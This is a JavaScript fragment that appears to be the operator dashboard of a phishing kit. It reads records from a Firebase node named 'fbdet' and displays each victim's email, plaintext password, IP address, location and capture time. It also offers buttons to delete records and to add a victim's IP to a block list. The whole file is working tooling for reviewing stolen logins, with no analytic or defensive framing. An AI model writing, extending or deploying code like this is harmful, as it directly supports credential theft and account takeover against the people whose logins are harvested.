Secondarydatabase.ref("fbdet").on('child_added', (snapshot) => {
    
    var html = ""
    html += "<div class='mydiv' id='message-"+snapshot.key+"'>";
    html += "<div id='detail-block'>";
    html += "<p><b>Email: </b>"+snapshot.val().email+"</p>";
    html += "<p><b>Password: </b>"+snapshot.val().password+"</p>";
    html += "<p><b>Time: </b>"+snapshot.val().Time+"</p>";
    html += "<p><b>Service Provider: </b>"+snapshot.val().countryCode+"</p>";
    html += "<p><b>country: </b>"+snapshot.val().countryName+"</p>";
    html += "<p><b>Date: </b>"+snapshot.val().formattedDate+"</p>";
    html += "<p><b>IP Address: </b>"+snapshot.val().ip+"</p>";
    html += "<p><b>State: </b>"+snapshot.val().state+"</p>";
    html += "<p><b>Timezone: </b>"+snapshot.val().continent + "/" + snapshot.val().state +"</p>";
    html += "<p>";
    html += "<button id='del' onclick='delbtn(this)' data-id="+snapshot.key+">Delete</button>";
    html += "<button id='blockx' onclick='Blockbtn(this)' data-id='"+snapshot.val().ip+"'>Block</button>";
    html += "</p>";
    html += "</div>";
    html += "</div>";
    html += "<hr>";
    document.getElementById("details-real").innerHTML += html;
    console.log(snapshot.key);
  }, (err) => {
    alert("There was an error fetching data from the database. Please reload this site.");
  });

  function delbtn(self){
    var data = self.getAttribute("data-id")
    Secondarydatabase.ref("fbdet").child(data).remove();
    
  }
  Secondarydatabase.ref("fbdet").on("child_removed", function (snapshot) {
    // remove message node
    document.getElementById("message-" + snapshot.key).innerHTML = "<b id='all-left'>Deleted</b>";
  });
  function Blockbtn(self){
    var info = self.getAttribute("data-id");
    Primarydatabase.ref("/disabled/ipaddress").push(info).then((result) => {
        alert("User Blocked");
    }).catch((err) => {
        alert(err.message);
    });;
    
  }